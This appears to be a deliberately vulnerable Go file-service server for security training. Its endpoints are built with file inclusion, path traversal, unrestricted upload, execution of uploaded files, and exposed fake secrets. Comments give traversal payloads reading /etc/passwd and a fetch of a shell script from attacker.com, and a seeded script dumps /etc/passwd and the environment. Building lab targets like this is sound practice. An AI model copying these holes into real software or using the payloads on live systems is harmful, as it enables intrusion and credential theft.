package main

import (
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/gin-contrib/cors"
	"github.com/gin-gonic/gin"
)

var uploadDir = "/app/uploads"
var documentDir = "/app/documents"

func main() {
	// Create directories
	os.MkdirAll(uploadDir, 0755)
	os.MkdirAll(documentDir, 0755)

	// Seed some files
	seedFiles()

	router := gin.Default()

	router.Use(cors.New(cors.Config{
		AllowOrigins:     []string{"*"},
		AllowMethods:     []string{"GET", "POST", "PUT", "DELETE", "OPTIONS"},
		AllowHeaders:     []string{"*"},
		ExposeHeaders:    []string{"*"},
		AllowCredentials: true,
	}))

	// VULNERABILITY 1: Local File Inclusion (LFI)
	router.GET("/api/files/read", readFile)

	// VULNERABILITY 2: Remote File Inclusion (RFI)
	router.GET("/api/files/include", includeFile)

	// VULNERABILITY 3: Arbitrary file upload
	router.POST("/api/files/upload", uploadFile)

	// VULNERABILITY 4: Path traversal
	router.GET("/api/files/download", downloadFile)

	// VULNERABILITY 5: Directory listing
	router.GET("/api/files/list", listFiles)

	// VULNERABILITY 6: Execute uploaded files
	router.GET("/api/files/execute", executeFile)

	// VULNERABILITY 7: Sensitive file exposure
	router.GET("/api/files/backup", getBackup)

	log.Println("File Service starting on port 8082")
	router.Run(":8082")
}

func seedFiles() {
	// Create some documents
	documents := map[string]string{
		"readme.txt":         "IntelliMetrics File Service\nVersion 1.0.0\nInternal Use Only",
		"config.txt":         "[Database]\nHost=mongo\nPort=27017\n\n[API]\nSecret=super_secret_key\nJWT=jwt_secret_123",
		"passwords.txt":      "admin:Admin123!\ndbadmin:Database!\nbackup:Backup2024!",
		"employees.csv":      "Name,Email,Department\nJohn Doe,john@intellimetrics.dev,IT\nSarah Smith,sarah@intellimetrics.dev,Sales",
		"sensitive_data.txt": "Credit Card Test Data:\n4532-1234-5678-9010\n\nSSN Test Data:\n123-45-6789",
		".env":               "DATABASE_URL=mongodb://mongo:27017\nAPI_KEY=sk-test-abc123\nAWS_SECRET=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
		".htpasswd":          "admin:$apr1$qAiD9pMz$XZGZcvPdMbH4NhRlHKNzN0",
		"backup.sql":         "-- Database Backup\nINSERT INTO users VALUES (1, 'admin', 'admin@test.com', 'Admin123!');",
	}

	for filename, content := range documents {
		filepath := filepath.Join(documentDir, filename)
		os.WriteFile(filepath, []byte(content), 0644)
	}

	// Create a shell script
	shellScript := `#!/bin/sh
echo "System Information:"
whoami
hostname
id
ifconfig || ip addr
cat /etc/passwd 2>/dev/null
env
`
	os.WriteFile(filepath.Join(uploadDir, "info.sh"), []byte(shellScript), 0755)
}

func readFile(c *gin.Context) {
	// CRITICAL VULNERABILITY: Local File Inclusion (LFI)
	filename := c.Query("file")

	if filename == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file parameter required"})
		return
	}

	// VULNERABLE: No path sanitization - can read ANY file on system
	// Try: ?file=../../../../etc/passwd
	// Try: ?file=../../../../app/documents/passwords.txt
	content, err := os.ReadFile(filename)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{
			"error": "File not found",
			"hint":  "Try using path traversal: ../../../../etc/passwd",
		})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"filename": filename,
		"content":  string(content),
	})
}

func includeFile(c *gin.Context) {
	// CRITICAL VULNERABILITY: Remote File Inclusion (RFI)
	url := c.Query("url")

	if url == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "url parameter required"})
		return
	}

	// VULNERABLE: Downloads and executes content from arbitrary URL
	// Try: ?url=http://attacker.com/shell.sh
	resp, err := http.Get(url)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to fetch URL"})
		return
	}
	defer resp.Body.Close()

	content, err := io.ReadAll(resp.Body)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to read content"})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"url":     url,
		"content": string(content),
		"warning": "This content was fetched from external URL - RFI vulnerability!",
	})
}

func uploadFile(c *gin.Context) {
	// CRITICAL VULNERABILITY: Unrestricted file upload
	file, err := c.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "No file provided"})
		return
	}

	// VULNERABLE: No file type validation, no size limits
	// Can upload: PHP shells, executable scripts, malware
	filename := filepath.Base(file.Filename)
	savePath := filepath.Join(uploadDir, filename)

	if err := c.SaveUploadedFile(file, savePath); err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Failed to save file"})
		return
	}

	// Make uploaded files executable
	os.Chmod(savePath, 0755)

	c.JSON(http.StatusOK, gin.H{
		"message":  "File uploaded successfully",
		"filename": filename,
		"path":     savePath,
		"hint":     "Try executing it: /api/files/execute?file=" + filename,
	})
}

func downloadFile(c *gin.Context) {
	// CRITICAL VULNERABILITY: Path traversal
	filename := c.Query("file")

	if filename == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file parameter required"})
		return
	}

	// VULNERABLE: No path validation - directory traversal possible
	// Try: ?file=../../documents/passwords.txt
	// Try: ?file=../../../../../../etc/passwd
	fullPath := filepath.Join(documentDir, filename)

	// Even worse - if they provide absolute path, it uses that
	if filepath.IsAbs(filename) {
		fullPath = filename
	}

	content, err := os.ReadFile(fullPath)
	if err != nil {
		c.JSON(http.StatusNotFound, gin.H{
			"error": "File not found",
			"hint":  "Try: ?file=passwords.txt or ?file=../../etc/passwd",
		})
		return
	}

	c.Header("Content-Disposition", "attachment; filename="+filepath.Base(filename))
	c.Data(http.StatusOK, "application/octet-stream", content)
}

func listFiles(c *gin.Context) {
	// VULNERABILITY: Exposes internal directory structure
	dir := c.Query("dir")
	if dir == "" {
		dir = documentDir
	}

	// VULNERABLE: Can list any directory
	files, err := os.ReadDir(dir)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": "Cannot read directory"})
		return
	}

	fileList := []gin.H{}
	for _, file := range files {
		info, _ := file.Info()
		fileList = append(fileList, gin.H{
			"name":  file.Name(),
			"size":  info.Size(),
			"isDir": file.IsDir(),
			"mode":  info.Mode().String(),
		})
	}

	c.JSON(http.StatusOK, gin.H{
		"directory": dir,
		"files":     fileList,
	})
}

func executeFile(c *gin.Context) {
	// CRITICAL VULNERABILITY: Arbitrary file execution
	filename := c.Query("file")

	if filename == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "file parameter required"})
		return
	}

	// VULNERABLE: Executes uploaded files without validation
	fullPath := filepath.Join(uploadDir, filename)

	// Check if file exists
	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		c.JSON(http.StatusNotFound, gin.H{"error": "File not found in uploads"})
		return
	}

	// CRITICAL: Execute the file
	var cmd *exec.Cmd
	if strings.HasSuffix(filename, ".sh") {
		cmd = exec.Command("/bin/sh", fullPath)
	} else {
		cmd = exec.Command(fullPath)
	}

	output, err := cmd.CombinedOutput()

	if err != nil {
		c.JSON(http.StatusOK, gin.H{
			"file":   filename,
			"output": string(output),
			"error":  err.Error(),
		})
		return
	}

	c.JSON(http.StatusOK, gin.H{
		"file":   filename,
		"output": string(output),
	})
}

func getBackup(c *gin.Context) {
	// VULNERABILITY: Exposes sensitive backup files
	backupFiles := []gin.H{
		{
			"filename": "database_backup.sql",
			"path":     "/backups/database_backup.sql",
			"size":     "2.4 MB",
			"date":     "2024-09-15",
		},
		{
			"filename": "user_passwords.txt",
			"path":     documentDir + "/passwords.txt",
			"size":     "1.2 KB",
			"date":     "2024-09-20",
		},
		{
			"filename": "config_backup.tar.gz",
			"path":     "/backups/config_backup.tar.gz",
			"size":     "512 KB",
			"date":     "2024-09-25",
		},
	}

	c.JSON(http.StatusOK, gin.H{
		"backups": backupFiles,
		"message": "Use /api/files/read?file=<path> to download",
	})
}
